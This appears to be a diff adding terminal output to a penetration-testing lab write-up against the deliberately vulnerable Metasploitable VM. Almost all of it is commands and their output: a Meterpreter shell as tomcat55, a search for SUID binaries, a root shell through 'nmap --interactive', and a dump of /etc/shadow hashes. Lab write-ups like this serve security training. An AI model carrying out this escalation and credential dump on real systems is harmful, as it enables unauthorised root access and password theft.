@@ -255,6 +255,121 @@ System Language : en_US
 Meterpreter     : java/linux
 meterpreter > getuid
 Server username: tomcat55
+meterpreter > shell
+Process 1 created.
+Channel 1 created.
+ls
+bin
+boot
+cdrom
+dev
+etc
+home
+initrd
+initrd.img
+lib
+lost+found
+media
+mnt
+nohup.out
+opt
+proc
+root
+sbin
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+/bin/bash
+which bash
+/bin/bash
+/bin/bash -i
+bash: no job control in this shell
+tomcat55@metasploitable:/$ cat /etc/shadow
+cat: /etc/shadow: Permission denied
+tomcat55@metasploitable:/$ find / -perm -4000 2>>/dev/null
+/bin/umount
+/bin/fusermount
+/bin/su
+/bin/mount
+/bin/ping
+/bin/ping6
+/sbin/mount.nfs
+/lib/dhcp3-client/call-dhclient-script
+/usr/bin/sudoedit
+/usr/bin/X
+/usr/bin/netkit-rsh
+/usr/bin/gpasswd
+/usr/bin/traceroute6.iputils
+/usr/bin/sudo
+/usr/bin/netkit-rlogin
+/usr/bin/arping
+/usr/bin/at
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/nmap
+/usr/bin/chsh
+/usr/bin/netkit-rcp
+/usr/bin/passwd
+/usr/bin/mtr
+/usr/sbin/uuidd
+/usr/sbin/pppd
+/usr/lib/telnetlogin
+/usr/lib/apache2/suexec
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/pt_chown
+tomcat55@metasploitable:/$ ls -la /usr/bin/nmap
+-rwsr-xr-x 1 root root 780676 2008-04-08 10:04 /usr/bin/nmap
+tomcat55@metasploitable:/$ /usr/bin/nmap --interactive
+Starting Nmap V. 4.53 ( http://insecure.org )
+Welcome to Interactive Mode -- press h <enter> for help
+nmap> !sh
+whoami
+root
+cat /etc/shadow
+root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
+daemon:*:14684:0:99999:7:::
+bin:*:14684:0:99999:7:::
+sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::
+sync:*:14684:0:99999:7:::
+games:*:14684:0:99999:7:::
+man:*:14684:0:99999:7:::
+lp:*:14684:0:99999:7:::
+mail:*:14684:0:99999:7:::
+news:*:14684:0:99999:7:::
+uucp:*:14684:0:99999:7:::
+proxy:*:14684:0:99999:7:::
+www-data:*:14684:0:99999:7:::
+backup:*:14684:0:99999:7:::
+list:*:14684:0:99999:7:::
+irc:*:14684:0:99999:7:::
+gnats:*:14684:0:99999:7:::
+nobody:*:14684:0:99999:7:::
+libuuid:!:14684:0:99999:7:::
+dhcp:*:14684:0:99999:7:::
+syslog:*:14684:0:99999:7:::
+klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::
+sshd:*:14684:0:99999:7:::
+msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
+bind:*:14685:0:99999:7:::
+postfix:*:14685:0:99999:7:::
+ftp:*:14685:0:99999:7:::
+postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:14685:0:99999:7:::
+mysql:!:14685:0:99999:7:::
+tomcat55:*:14691:0:99999:7:::
+distccd:*:14698:0:99999:7:::
+user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:14699:0:99999:7:::
+service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:14715:0:99999:7:::
+telnetd:*:14715:0:99999:7:::
+proftpd:!:14727:0:99999:7:::
+statd:*:15474:0:99999:7:::
+
+
+
+
 ```
 
 ### Outcome
